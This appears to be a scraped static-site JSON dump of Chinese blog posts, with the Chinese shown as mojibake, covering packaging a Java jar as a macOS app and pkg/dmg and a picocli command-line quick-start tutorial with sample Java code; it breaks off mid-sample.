\n#å®æ´è®¾ç½®\njar2app test.jar -n "amazing application" out.app -i /awesomeicons/icon.icns \njar2app test.jar -n "amazing application" out.app -i /awesomeicons/icon.icns -r /compressedjdks/jdk1.8.0_40.jdk.zip  \n#å¸¦jdrãè½æ¬¾,è®¾ç½®èåå,è¿è¡æå\njar2app df_home.jar -n "df_home" app/df_home.app -i /users/df/pictures/logo/df_logo/untitled.icns -c "copyright Â© 2020 df inc." -r /library/java/javavirtualmachines/jdk1.8.0_91.jdk\njar2app /users/df/documents/åå¸/df_home.jar  -n "df_home" /users/df/documents/åå¸/app/df_home.app -i /users/df/pictures/logo/df_logo/untitled.icns -c "copyright Â© 2020 df inc."\n#å¸¦è½æ¬¾,è®¾ç½®èåå,è¿è¡æå\njar2app df_home.jar -n "df_home" app/df_home_0.app -i /users/df/pictures/logo/df_logo/untitled.icns -c "copyright Â© 2020 df inc."\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nå¯¹åºåæ°è§£é\n\n-n : å°±æ¯ç¨åºè¿è¡æ¶ï¼å¨èåæ ä¸çåç§°\n\n-i : è½¬æ¢æappä¹åï¼åºç¨çlogoï¼å¾çæ ¼å¼è¦ä½¿ç¨.icns åç¼ï¼è¿éæä¾ä¸ä¸pngè½¬.icnsçurlï¼https://iconverticons.com/online/\n\n-b : å¯æå¯æ çä¸è¥¿ï¼è¿ä¸ªæ¯ççå¯æå¯æ ï¼å°±æ¯ä¸è½¯ä»¶åºç¡ä¿¡æ¯\n\n-v : å¯æå¯æ çä¸è¥¿ï¼è¿ä¸ªæ¯ççå¯æå¯æ ï¼å°±æ¯ä¸è½¯ä»¶åºç¡ä¿¡æ¯\n\n-s : å¯æå¯æ çä¸è¥¿ï¼è¿ä¸ªæ¯ççå¯æå¯æ ï¼å°±æ¯ä¸è½¯ä»¶åºç¡ä¿¡æ¯\n\n-m : è¿ä¸ªå¯ä»¥æï¼æäºå®è½¯ä»¶å¯å¨è½å¿«ä¸ç§ï¼æ²¡äºå®ï¼appåºç¨å¾å»jaréé¢æ¾mainå¥å£å½æ°ï¼æä»¥ï¼è¿ä¸ªå¯ä»¥æï¼é¿çä¸èæ¶é´å¤çå¿½ç¥è¿ä¸ªåæ°ãè³äºmainå¥å£å¨åªéçï¼ç¨åç¼©åæ¹å¼æå¼jaræä»¶ï¼éé¢æ¾å°meta-infæä»¶ä¸çæä»¶æå¼ççå°±å¥½ï¼å¯ä»¥çå°mainä¸»å½æ°å¥å£ä¿¡æ¯çã\n\n-o : å°±æ¯è®©è¿ä¸ªç¨åºæ§è¡çæ¶åï¼å¨æ é¢æ æä¸ªèåå¯ä»¥æ¾ç¤º\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# å°è£dmg\n\nquickpkgå¯ä»¥å¿«éæ¹ä¾¿çæappåºç¨æåæpkgå®è£åï¼å®è£quickpkgï¼\n\ngit clone https://github.com/scriptingosx/quickpkg.git\n\ncd quickpkg\n\n\n1\n2\n3\n\n\nappå°è£ä¸ºpkgï¼\n\n./quickpkg /users/csjar/xxxx.app --output /users/csjar/x x x x.pkg\n\n\n1\n\n\nä¸å --outputåæ°æå®è¾åºè·¯å¾ï¼é»è®¤ä¼å¨quickpkgç®å½ä¸çæã\n\nappæåædmgï¼\n\nï¼1ï¼æå¼ç£çå·¥å·ï¼éæ©æä»¶ -> æ°å»ºæ å -> ç©ºç½æ å\nï¼2ï¼å¡«åæ åç¸å³ä¿¡æ¯ï¼å¶ä¸­å¤§å°éè¦è®¾ç½®çæ¯appç¨åºå¤§ä¸äºã\nï¼3ï¼è¿å¥dmgæä»¶ï¼å¨æ­¤å¤æå¼å½ä»¤è¡ï¼åå»ºapplicationsé¾æ¥ã\nln -s /applications/ applications\nï¼4ï¼å³é®dmgæä»¶ï¼âæ¥çæ¾ç¤ºéé¡¹âä¸­è®¾ç½®èæ¯å¾çã\n\n\n1\n2\n3\n4\n5\n\n\nå¾ç\nè¿éé¢è¸©äºæ æ°ä¸ªåï¼ååå¤å¤å¥½é¿ä¸æ®µæ¶é´æè§£å³ã\nå·¥å·è®°å¾å¤è¯»æåï¼ä¾å¦å¨è¿éç¨ç jar2app ç´æ¥å¨ github ä¸é¢å¤è¯»æåï¼åºæ¬é®é¢é½è½è§£å³ï¼\nå¾ç\nå¾ç\nå®ç°åæ ·åè½çä¸åå½æ°ï¼å¨ä½¿ç¨æ¶éè¦æç§éæ±è¿è¡ä½¿ç¨ãä¾å¦è¿éç file ().exists () ä¸ file.getabsolutefile ()ï¼ä¸åå½æ°åæ»æä¼ä¸ä¸æ ·çå°æ¹ï¼ç´æ¥å¹³æ¶åªæ¯ä¸ºäºå®ç°åè½èå¿½ç¥å¶æ¬è´¨ï¼ææ¶ååºç°é®é¢çæ¶åéè¦æ·±å¥äºè§£å¶æ¬è´¨ï¼\nwinç¨æ·å¯ä»¥æç´¢jar2exe æ¥å¯¹exeè¿è¡å°åã\néå°åç§é®é¢å¯ä»¥æ·»å è¿è¥å¾®ä¿¡ è¿è¡æ²éè§£å³æçå¨githubä¸æissuesã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# åæ\n\nhttps://mp.weixin.qq.com/s/x6fyn1vx1p52rud9pv_dvg\n\nç®åè®°å½ï¼æ¹ä¾¿åç»­ä½¿ç¨ï¼å¦æä¾µæï¼èç³»å é¤ã',charsets:{cjk:!0},lastUpdated:"2022/05/01, 06:34:13",lastUpdatedTimestamp:1651386853e3},{title:"Java Picocli Quick Start",frontmatter:{title:"Java Picocli Quick Start",date:"2022-04-26T03:00:00.000Z",permalink:"/sec/skill/picocli-quick-start",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¥æ·«å·§æ","å°å·¥å·"],tags:["Java","CLI","Tools"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/203.%E5%A5%87%E6%B7%AB%E5%B7%A7%E6%8A%80/2030.%E5%B0%8F%E5%B7%A5%E5%85%B7/01.picocli.html",relativePath:"02.å®å¨/203.å¥æ·«å·§æ/2030.å°å·¥å·/01.picocli.md",key:"v-880aa198",path:"/sec/skill/picocli-quick-start/",headers:[{level:2,title:"ç®ä»",slug:"ç®ä»",normalizedTitle:"ç®ä»",charIndex:431},{level:2,title:"å¥é¨æ¡ä¾",slug:"å¥é¨æ¡ä¾",normalizedTitle:"å¥é¨æ¡ä¾",charIndex:824},{level:3,title:"ASCIIArt æºç è§£è¯»",slug:"asciiart-æºç è§£è¯»",normalizedTitle:"asciiart æºç è§£è¯»",charIndex:1619},{level:3,title:"è¿è¡ç¨åº",slug:"è¿è¡ç¨åº",normalizedTitle:"è¿è¡ç¨åº",charIndex:4953},{level:2,title:"å­å½ä»¤æ¡ä¾",slug:"å­å½ä»¤æ¡ä¾",normalizedTitle:"å­å½ä»¤æ¡ä¾",charIndex:5175},{level:3,title:"æºç è§£è¯»",slug:"æºç è§£è¯»",normalizedTitle:"æºç è§£è¯»",charIndex:1628},{level:3,title:"æ§è¡åæ¹åä»¥ä¸çä»£ç ",slug:"æ§è¡åæ¹åä»¥ä¸çä»£ç ",normalizedTitle:"æ§è¡åæ¹åä»¥ä¸çä»£ç ",charIndex:9223},{level:2,title:"éé¡¹ååæ°",slug:"éé¡¹ååæ°",normalizedTitle:"éé¡¹ååæ°",charIndex:13655},{level:3,title:"éé¡¹æ³¨è§£",slug:"éé¡¹æ³¨è§£",normalizedTitle:"éé¡¹æ³¨è§£",charIndex:13742},{level:3,title:"åæ°æ³¨è§£",slug:"åæ°æ³¨è§£",normalizedTitle:"åæ°æ³¨è§£",charIndex:15014},{level:2,title:"å¼ºç±»åè½¬æ¢",slug:"å¼ºç±»åè½¬æ¢",normalizedTitle:"å¼ºç±»åè½¬æ¢",charIndex:15826},{level:3,title:"ç±»åè½¬æ¢",slug:"ç±»åè½¬æ¢",normalizedTitle:"ç±»åè½¬æ¢",charIndex:15827},{level:3,title:"éååå­å¸",slug:"éååå­å¸",normalizedTitle:"éååå­å¸",charIndex:16092},{level:2,title:"å¿éåæ°",slug:"å¿éåæ°",normalizedTitle:"å¿éåæ°",charIndex:16513},{level:3,title:"å¿ééé¡¹",slug:"å¿ééé¡¹",normalizedTitle:"å¿ééé¡¹",charIndex:16522},{level:3,title:"å¿éåæ°",slug:"å¿éåæ°-2",normalizedTitle:"å¿éåæ°",charIndex:16513},{level:2,title:"å¤å¼",slug:"å¤å¼",normalizedTitle:"å¤å¼",charIndex:16826},{level:3,title:"éå¤éé¡¹",slug:"éå¤éé¡¹",normalizedTitle:"éå¤éé¡¹",charIndex:16833},{level:3,title:"æ­£åæå",slug:"æ­£åæå",normalizedTitle:"æ­£åæå",charIndex:17009},{level:3,title:"arity",slug:"arity",normalizedTitle:"arity",charIndex:6781},{level:2,title:"Helpéé¡¹",slug:"helpéé¡¹",normalizedTitle:"helpéé¡¹",charIndex:4585},{level:3,title:"èªå®ä¹helpéé¡¹",slug:"èªå®ä¹helpéé¡¹",normalizedTitle:"èªå®ä¹helpéé¡¹",charIndex:18396},{level:2,title:"Version Help",slug:"version-help",normalizedTitle:"version help",charIndex:19418},{level:3,title:"éæçæ¬ä¿¡æ¯",slug:"éæçæ¬ä¿¡æ¯",normalizedTitle:"éæçæ¬ä¿¡æ¯",charIndex:19435},{level:3,title:"å¨æçæ¬ä¿¡æ¯",slug:"å¨æçæ¬ä¿¡æ¯",normalizedTitle:"å¨æçæ¬ä¿¡æ¯",charIndex:19968},{level:2,title:"Usage Help",slug:"usage-help",normalizedTitle:"usage help",charIndex:20124},{level:3,title:"ä½¿ç¨ä¿¡æ¯ç¤ºä¾",slug:"ä½¿ç¨ä¿¡æ¯ç¤ºä¾",normalizedTitle:"ä½¿ç¨ä¿¡æ¯ç¤ºä¾",charIndex:20139},{level:3,title:"ä½¿ç¨å¸®å©æ¶æ¯åç´ ",slug:"ä½¿ç¨å¸®å©æ¶æ¯åç´ ",normalizedTitle:"ä½¿ç¨å¸®å©æ¶æ¯åç´ ",charIndex:21783},{level:2,title:"ANSIé¢è²åé£æ ¼",slug:"ansié¢è²åé£æ ¼",normalizedTitle:"ansié¢è²åé£æ ¼",charIndex:25056},{level:3,title:"å½©è²ç¤ºä¾",slug:"å½©è²ç¤ºä¾",normalizedTitle:"å½©è²ç¤ºä¾",charIndex:25070},{level:3,title:"æ ·å¼åé¢è²çä½¿ç¨å¸®å©",slug:"æ ·å¼åé¢è²çä½¿ç¨å¸®å©",normalizedTitle:"æ ·å¼åé¢è²çä½¿ç¨å¸®å©",charIndex:25125},{level:3,title:"æ´å¤é¢è²",slug:"æ´å¤é¢è²",normalizedTitle:"æ´å¤é¢è²",charIndex:26508},{level:3,title:"æ¯æçå¹³å°",slug:"æ¯æçå¹³å°",normalizedTitle:"æ¯æçå¹³å°",charIndex:26678},{level:3,title:"å¼ºå¶å¼å¯æå³é­ANSI",slug:"å¼ºå¶å¼å¯æå³é­ansi",normalizedTitle:"å¼ºå¶å¼å¯æå³é­ansi",charIndex:26781},{level:2,title:"å­å½ä»¤",slug:"å­å½ä»¤",normalizedTitle:"å­å½ä»¤",charIndex:5175},{level:3,title:"æ³¨åå­å½ä»¤",slug:"æ³¨åå­å½ä»¤",normalizedTitle:"æ³¨åå­å½ä»¤",charIndex:8507},{level:3,title:"è§£æå­å½ä»¤",slug:"è§£æå­å½ä»¤",normalizedTitle:"è§£æå­å½ä»¤",charIndex:28570},{level:3,title:"@ParentCommandæ³¨è§£",slug:"parentcommandæ³¨è§£",normalizedTitle:"@parentcommandæ³¨è§£",charIndex:30410},{level:3,title:"å­å½ä»¤çä½¿ç¨å¸®å©",slug:"å­å½ä»¤çä½¿ç¨å¸®å©",normalizedTitle:"å­å½ä»¤çä½¿ç¨å¸®å©",charIndex:23772},{level:2,title:"éå¤ä½¿ç¨",slug:"éå¤ä½¿ç¨",normalizedTitle:"éå¤ä½¿ç¨",charIndex:32024},{level:2,title:"æ§è¡å½ä»¤",slug:"æ§è¡å½ä»¤",normalizedTitle:"æ§è¡å½ä»¤",charIndex:32542},{level:3,title:"éåºä»£ç ",slug:"éåºä»£ç ",normalizedTitle:"éåºä»£ç ",charIndex:4433},{level:3,title:"çæéåºä»£ç ",slug:"çæéåºä»£ç ",normalizedTitle:"çæéåºä»£ç ",charIndex:33877},{level:3,title:"ä¾å¤éåºä»£ç ",slug:"ä¾å¤éåºä»£ç ",normalizedTitle:"ä¾å¤éåºä»£ç ",charIndex:34501},{level:3,title:"æ§è¡éç½®",slug:"æ§è¡éç½®",normalizedTitle:"æ§è¡éç½®",charIndex:34847},{level:3,title:"å¤çéè¯¯",slug:"å¤çéè¯¯",normalizedTitle:"å¤çéè¯¯",charIndex:4378},{level:3,title:"è¿ç§»",slug:"è¿ç§»",normalizedTitle:"è¿ç§»",charIndex:35453},{level:2,title:"è¿½è¸ª",slug:"è¿½è¸ª",normalizedTitle:"è¿½è¸ª",charIndex:35595},{level:2,title:"èªå¨è¡¥å¨",slug:"èªå¨è¡¥å¨",normalizedTitle:"èªå¨è¡¥å¨",charIndex:37e3},{level:2,title:"æ´å¤",slug:"æ´å¤",normalizedTitle:"æ´å¤",charIndex:4510}],excerpt:'<h1 id="picocli"><a class="header-anchor" href="#picocli">#</a> picocli</h1>\n<blockquote>\n<p>æè¿çªåå¥æ³å°è¯ç¨Javaåä¸åå®å¨å°å·¥å·ãä¸è¿ä¸äºå¼å¤´é¾ï¼å¦ä½å¨å½ä»¤è¡ä¸æå°å¸®å©ææ¡£ç«ç¶ä¸ç´å°æ°çæãå½ç¶ï¼è¿ä¸ªå®ç°èµ·æ¥å¶å®ä¸é¾ï¼ä½æ¯åèµ·æ¥æ··ä¹±ä¸ä¸ç¾è§ã</p>\n<p>åå¼å§çæ¶åï¼ä¸ºäºæå°åºå½©è²çå­ç¬¦ï¼æå°è¯ä½¿ç¨<code>\\033[</code>è¿ç§è½¬ä¹å­ç¬¦ï¼å¹¶åäºä¸ä¸ªå·¥å·ç±»ï¼ç¨äºçææå®æ ¼å¼åé¢è²çæå°å­ç¬¦ä¸²ãå¶å®ï¼éå¯¹äºå½ä»¤è¡æ©æå¶ä»çè§£å³æ¹æ¡ï¼ä¸ä½¿ç¨èµ·æ¥æ¯è¾é¡ºæåè§èï¼æå·®ç¹æ³èªå·±åä¸ä¸ªââä½å¿éå¤é è½®å­å¢ï¼ï¼è¯¸å¦Apache Commons CLIç­ãå¨å°è¯ä½¿ç¨Commons CLIæ¶ï¼æåç°å®ç¡®å®å¥½ç¨ï¼ä½æ¯ä¼¼ä¹æ»¡è¶³ä¸äºå½©è²æå°çéæ±ãäºæ¯æå¼å§å¯»æ¾å¶ä»çè§£å³æ¹æ¡ï¼æç»åç°äºpicocliã</p>\n</blockquote>\n',headersStr:"ç®ä» å¥é¨æ¡ä¾ ASCIIArt æºç è§£è¯» è¿è¡ç¨åº å­å½ä»¤æ¡ä¾ æºç è§£è¯» æ§è¡åæ¹åä»¥ä¸çä»£ç  éé¡¹ååæ° éé¡¹æ³¨è§£ åæ°æ³¨è§£ å¼ºç±»åè½¬æ¢ ç±»åè½¬æ¢ éååå­å¸ å¿éåæ° å¿ééé¡¹ å¿éåæ° å¤å¼ éå¤éé¡¹ æ­£åæå arity Helpéé¡¹ èªå®ä¹helpéé¡¹ Version Help éæçæ¬ä¿¡æ¯ å¨æçæ¬ä¿¡æ¯ Usage Help ä½¿ç¨ä¿¡æ¯ç¤ºä¾ ä½¿ç¨å¸®å©æ¶æ¯åç´  ANSIé¢è²åé£æ ¼ å½©è²ç¤ºä¾ æ ·å¼åé¢è²çä½¿ç¨å¸®å© æ´å¤é¢è² æ¯æçå¹³å° å¼ºå¶å¼å¯æå³é­ANSI å­å½ä»¤ æ³¨åå­å½ä»¤ è§£æå­å½ä»¤ @ParentCommandæ³¨è§£ å­å½ä»¤çä½¿ç¨å¸®å© éå¤ä½¿ç¨ æ§è¡å½ä»¤ éåºä»£ç  çæéåºä»£ç  ä¾å¤éåºä»£ç  æ§è¡éç½® å¤çéè¯¯ è¿ç§» è¿½è¸ª èªå¨è¡¥å¨ æ´å¤",content:'# picocli\n\n> æè¿çªåå¥æ³å°è¯ç¨Javaåä¸åå®å¨å°å·¥å·ãä¸è¿ä¸äºå¼å¤´é¾ï¼å¦ä½å¨å½ä»¤è¡ä¸æå°å¸®å©ææ¡£ç«ç¶ä¸ç´å°æ°çæãå½ç¶ï¼è¿ä¸ªå®ç°èµ·æ¥å¶å®ä¸é¾ï¼ä½æ¯åèµ·æ¥æ··ä¹±ä¸ä¸ç¾è§ã\n> \n> åå¼å§çæ¶åï¼ä¸ºäºæå°åºå½©è²çå­ç¬¦ï¼æå°è¯ä½¿ç¨\\033[è¿ç§è½¬ä¹å­ç¬¦ï¼å¹¶åäºä¸ä¸ªå·¥å·ç±»ï¼ç¨äºçææå®æ ¼å¼åé¢è²çæå°å­ç¬¦ä¸²ãå¶å®ï¼éå¯¹äºå½ä»¤è¡æ©æå¶ä»çè§£å³æ¹æ¡ï¼ä¸ä½¿ç¨èµ·æ¥æ¯è¾é¡ºæåè§èï¼æå·®ç¹æ³èªå·±åä¸ä¸ªââä½å¿éå¤é è½®å­å¢ï¼ï¼è¯¸å¦Apache Commons CLIç­ãå¨å°è¯ä½¿ç¨Commons CLIæ¶ï¼æåç°å®ç¡®å®å¥½ç¨ï¼ä½æ¯ä¼¼ä¹æ»¡è¶³ä¸äºå½©è²æå°çéæ±ãäºæ¯æå¼å§å¯»æ¾å¶ä»çè§£å³æ¹æ¡ï¼æç»åç°äºpicocliã\n\nå¿«éå¥é¨ææ¡£å°åï¼https://picocli.info/quick-guide.html\n\nå®æ´ææ¡£å°åï¼https://picocli.info\n\nGithubå°åï¼https://github.com/remkop/picocli\n\n\n# ç®ä»\n\n> Picocliä½¿ç¨æ¥è¿é¶ä»£ç çæ¹å¼å¨ä¸ä¸ªæä»¶ä¸­å®æJava CLIç¨åºçåå»ºï¼Picocliçç®æ æ¯åå»ºä¸ä¸ªå¯ä»¥å¨JVMè¿è¡æèè±ç¦»JVMçè¯·æå½ä»¤è¡åºç¨ã\n\nPicocliæ¯æè¯¸å¦ï¼POSIXãGNUãMS-DOSç­å¤ç§å½ä»¤è¡è¯­æ³æ ·å¼ï¼å¹¶ä¸å¯ä»¥ANSIé¢è²åæ ·å¼çæé«åº¦å®å¶åçå¸®å©ä¿¡æ¯ãåºäºPicocliåå»ºçå½ä»¤è¡ç¨åºæ¯æä»»ä½å±çº§ä¸çå½ä»¤åæ°æç¤ºåè¡¥å¨ãåºäºpicocliçåºç¨ç¨åºå¯ä»¥æåç¼è¯ä¸ºGRaalVMæ¬æºæ åï¼å¯å¨æ¶é´æå¿«ï¼åå­è¦æ±æ´ä½ï¼å¯ä»¥ä½ä¸ºåä¸ªå¯æ§è¡æä»¶ååãPicocliè¿å¯ä»¥ä¸ºæ¨çåºç¨ç¨åºçæç²¾ç¾çææ¡£ï¼æ ¼å¼åæ¬HTMLãPDFåUnixæåé¡µã\n\nä½¿ç¨å¸®å©çä¾å­ï¼\n\n\n\n> æ¬æä½¿ç¨picocliçæ³¨è§£APIãå¯¹äºæ æ³ä½¿ç¨æ³¨è§£çåºç¨ç¨åºï¼è¿æä¸ä¸ªç¼ç¨APIï¼ç¨äºå®ä¹é¢æçéé¡¹åä½ç½®åæ°ï¼å¹¶å¤çè§£æç»æãæ¬å¿«éæåä¸æ¶µçç¼ç¨APIã\n\n\n# å¥é¨æ¡ä¾\n\nä¸é¢ä»¥ä¸ä¸ªå°åä½åè½é½å¨çåºäºpicocliçå½ä»¤è¡åºç¨ç¨åºASCIIArtä½ä¸ºç¤ºä¾ä»£ç ã\n\nASCIIArtå°ä¸ä¸ªæå¤ä¸ªåæ°è½¬æ¢ä¸ºASCIIå­ç¬¦ç»ï¼å¹¶å°å¶æå°åºæ¥ãä½¿ç¨æ¹æ³å¦ä¸ï¼\n\n$ java -cp "myapp.jar;picocli-4.6.3.jar" ASCIIArt --font-size=9 Hello picocli\n       #   #       #  #                 #                  #  #\n       #   #       #  #                                    #\n       #   #  ***  #  #  ****     #***  #  **#  ****  **#  #  #\n       #####  ***  #  #  ****     #***  #  **   ****  **   #  #\n       #   #  *#*  #  #  *  *     #  *  #  *    *  *  *    #  #\n       #   #  **   #  #  ****     #***  #  **   ****  **   #  #\n       #   #  **#  #  #  ****     #***  #  **#  ****  **#  #  #\n                                  #\n                                  *\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nå¦æä½ æ³ç´æ¥ä»¥ä»¥ä¸çæ¹å¼è¿è¡ï¼å¯ä»¥æ¥çåºç¨æåçç¸å³ææ¡£ã\n\nASCIIArt --font-size=9 Hello picocli\n\n\n1\n\n\n\n# ASCIIArt æºç è§£è¯»\n\nASCIIArtçä»£ç ç¼©ç­å¦ä¸ï¼\n\n/**\n * ASCII Art: Basic Picocli based sample application\n * Explanation: <a href="https://picocli.info/quick-guide.html#_basic_example_asciiart">Picocli quick guide</a>\n * Source Code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/i18n/I18NDemo.java">GitHub</a> \n * @author Andreas Deininger\n */\nimport picocli.CommandLine;\nimport picocli.CommandLine.Command;\nimport picocli.CommandLine.Option;\nimport picocli.CommandLine.Parameters;\n\nimport java.awt.Font;\nimport java.awt.Graphics;\nimport java.awt.Graphics2D;\nimport java.awt.RenderingHints;\nimport java.awt.image.BufferedImage;\n\n@Command(name = "ASCIIArt", version = "ASCIIArt 1.0", mixinStandardHelpOptions = true) // |1|\npublic class ASCIIArt implements Runnable { // |2|\n\n    @Option(names = { "-s", "--font-size" }, description = "Font size") // |3|\n    int fontSize = 14;\n\n    @Parameters(paramLabel = "<word>", defaultValue = "Hello, picocli",  // |4|\n               description = "Words to be translated into ASCII art.")\n    private String[] words = { "Hello,", "picocli" }; // |5|\n\n    @Override\n    public void run() { // |6|\n        // https://stackoverflow.com/questions/7098972/ascii-art-java\n        BufferedImage image = new BufferedImage(144, 32, BufferedImage.TYPE_INT_RGB);\n        Graphics graphics = image.getGraphics();\n        graphics.setFont(new Font("Dialog", Font.PLAIN, fontSize));\n        Graphics2D graphics2D = (Graphics2D) graphics;\n        graphics2D.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING,\n                RenderingHints.VALUE_TEXT_ANTIALIAS_ON);\n        graphics2D.drawString(String.join(" ", words), 6, 24);\n\n        for (int y = 0; y < 32; y++) {\n            StringBuilder builder = new StringBuilder();\n            for (int x = 0; x < 144; x++)\n                builder.append(image.getRGB(x, y) == -16777216 ? " " : image.getRGB(x, y) == -1 ? "#" : "*");\n            if (builder.toString().trim().isEmpty()) continue;\n            System.out.println(builder);\n        }\n    }\n\n    public static void main(String[] args) {\n        int exitCode = new CommandLine(new ASCIIArt()).execute(args); // |7|\n        System.exit(exitCode); // |8|\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\næä»¬å¯ä»¥æä¸é¢çä»£ç æåæ¥çï¼\n\n 1. åå»ºä¸ä¸ªç±»ç»§æ¿RunableæèCallableã\n 2. ä½¿ç¨@Commandæ³¨è§£æ æ³¨è¿ä¸ªç±»ï¼å¹¶è®¾ç½®ä¸ä¸ªåå­ï¼mixinStandardHelpOptionséé¡¹ç¨äºçæä¸ä¸ªå¸®å©åçæ¬ææ¡£ï¼ä½¿ç¨åæ°--helpå--versionï¼ã\n 3. ç»æ¯ä¸ä¸ªå½ä»¤éé¡¹å¯¹åºçæååéæ·»å ä¸ä¸ª@Optionæ³¨è§£ï¼å¦ä¸æç¤ºï¼ä½ å¯ä»¥å®ä¹ä¸ä¸ªéé¡¹çåç§°åæ³¨éãå½ç¶ï¼è¿æä¸äºå¶ä»çéé¡¹ã\n 4. ç»æ¯ä¸ä¸ªå¯è½çåæ°æ·»å ä¸ä¸ª@Parametersæ³¨è§£ï¼Picocliå°æå½ä»¤è¡åæ°è½¬æ¢ä¸ºå¼ºç±»åå¼ï¼å¹¶å°è¿äºå¼æ³¨å¥è¢«æ³¨è§£çå­æ®µã\n 5. å¨ç±»çrunæcallæ¹æ³ä¸­å®ä¹æ¨çä¸å¡é»è¾ãè§£ææåå®æåè°ç¨æ­¤æ¹æ³ã\n 6. å¨ç±»çmainæ¹æ³ä¸­ï¼ä½¿ç¨CommandLine.executeæ¹æ³å¼å¯¼åºç¨ç¨åºãè¿å°è§£æå½ä»¤è¡ï¼å¤çéè¯¯ï¼å¤çä½¿ç¨è¯·æ±åçæ¬å¸®å©ï¼å¹¶è°ç¨ä¸å¡é»è¾ã\n 7. CommandLine.executeæ¹æ³è¿åä¸ä¸ªéåºä»£ç ãæ¨çåºç¨ç¨åºå¯ä»¥ä½¿ç¨æ­¤éåºä»£ç è°ç¨System.exitï¼ä»¥è¡¨ç¤ºè°ç¨è¿ç¨çæåæå¤±è´¥ã\n\nè¿æ¯å ä¹ä»»ä½picocliåºç¨çåºæ¬æ¡æ¶ã\n\n> æå³æ´å¤ä½¿ç¨å¸®å©ï¼è¯·åéåèæåï¼ä¾å¦ç»æ¹æ³æ·»å ä¸ä¸ªæ³¨è§£ã\n\nåä»»ä½ä¸ä¸çå½ä»¤è¡åºç¨ç¨åºä¸æ ·ï¼ASCIIArtæ--helpå--versionéé¡¹ã--Helpéé¡¹åç¨æ·å±ç¤ºäºå¦ä½ä½¿ç¨åºç¨ç¨åºãPicocliä¼èªå¨çææ­¤ä½¿ç¨å¸®å©æ¶æ¯ï¼\n\n$ ASCIIArt --help\nUsage: ASCIIArt [-hV] [-s=<fontsize>] [<word>...]\n      [<word>...]             Words to be translated into ASCII art.\n  -s, --font-size=<fontSize>  Font size\n  -h, --help                  Show this help message and exit.\n  -V, --version               Print version information and exit.\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# è¿è¡ç¨åº\n\næ·»å picocliä¾èµã\n\n<dependencies>\n  <dependency>\n    <groupId>info.picocli</groupId>\n    <artifactId>picocli</artifactId>\n    <version>4.6.3</version>\n  </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nè®¾ç½®è¿è¡åæ°ä¸º-hå¹¶è¿è¡ã\n\n\n\n\n# å­å½ä»¤æ¡ä¾\n\nä¸é¢æä»¬å±ç¤ºäºå¦ä¸ä¸ªå°åä½åè½é½å¨çåºäºpicocliçå½ä»¤è¡åºç¨ç¨åºç¤ºä¾ï¼è¯¥åºç¨ç¨åºè§£éäºå­å½ä»¤çä½¿ç¨ï¼ISOCodeResolverã\n\nè¯¥åºç¨ç¨åºæä¸¤ä¸ªå­å½ä»¤ï¼è¯­è¨åå½å®¶ï¼æ ¹æ®ISOæ åè§£æè¯­è¨æå½å®¶ä»£ç ï¼å½å®¶ä»£ç ä¸ºISO-3166-1ï¼è¯­è¨ä»£ç ä¸ºISO-639-1/639-2ï¼ãè¯¥åºç¨ç¨åºå¯ä»¥æä»¥ä¸æ¹å¼ä½¿ç¨ï¼\n\n$ java -cp "myapp.jar;picocli-4.6.3.jar" ISOCodeResolver language de cs en sd se\nde: German\ncs: Czech\nen: English\nsd: Sindhi\nse: Northern Sami\n\n\n1\n2\n3\n4\n5\n6\n\n\næèï¼\n\n$ java -cp "myapp.jar;picocli-4.6.3.jar" ISOCodeResolver country cn fr th ro no\nCN: China\nFR: France\nTH: Thailand\nRO: Romania\nNO: Norway\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# æºç è§£è¯»\n\næºä»£ç å¦ä¸æç¤ºï¼\n\n/*\n * ISO code resolver: Picocli based sample application (with subcommands)\n * Explanation: <a href="https://picocli.info/quick-guide.html#_subcommands_example_iso_code_resolver">Picocli quick guide</a>\n * Source Code: <a href="https://github.com/remkop/picocli/blob/master/picocli-examples/src/main/java/picocli/examples/subcommands/SubcommandDemo.java">GitHub</a> \n * @author Andreas Deininger\n */\nimport picocli.CommandLine;\nimport picocli.CommandLine.Command;\nimport picocli.CommandLine.Model.CommandSpec;\nimport picocli.CommandLine.Parameters;\nimport picocli.CommandLine.ParameterException;\nimport picocli.CommandLine.Spec;\nimport java.util.Locale;\n\n@Command(name = "ISOCodeResolver", subcommands = { SubcommandAsClass.class, CommandLine.HelpCommand.class }, // |2|\n         description = "Resolve ISO country codes (ISO-3166-1) or language codes (ISO 639-1 or -2)")\npublic class ISOCodeResolver implements Runnable { // |1|\n  @Spec CommandSpec spec;\n\n  @Command(name = "country", description = "Resolve ISO country code (ISO-3166-1, Alpha-2 code)") // |3|\n  void subCommandViaMethod(@Parameters(arity = "1..*", paramLabel = "<country code>",\n                                       description = "country code(s) to be resolved") String[] countryCodes) {\n    for (String code : countryCodes) {\n      System.out.println(String.format("%s: %s", code.toUpperCase(), new Locale("", code).getDisplayCountry()));\n    }\n  }\n\n  @Override\n  public void run() {\n    throw new ParameterException(spec.commandLine(), "Specify a subcommand");\n  }\n\n  public static void main(String[] args) {\n    int exitCode = new CommandLine(new ISOCodeResolver()).execute(args); // |5|\n    System.exit(exitCode); // |6|\n  }\n}\n\n@Command(name = "language", description = "Resolve ISO language code (ISO 639-1 or -2, two/three letters)") // |4|\nclass SubcommandAsClass implements Runnable {\n\n  @Parameters(arity = "1..*", paramLabel = "<language code>", description = "language code(s) to be resolved")\n  private String[] languageCodes;\n\n  @Override\n  public void run() {\n    for (String code : languageCodes) {\n      System.out.println(String.format("%s: 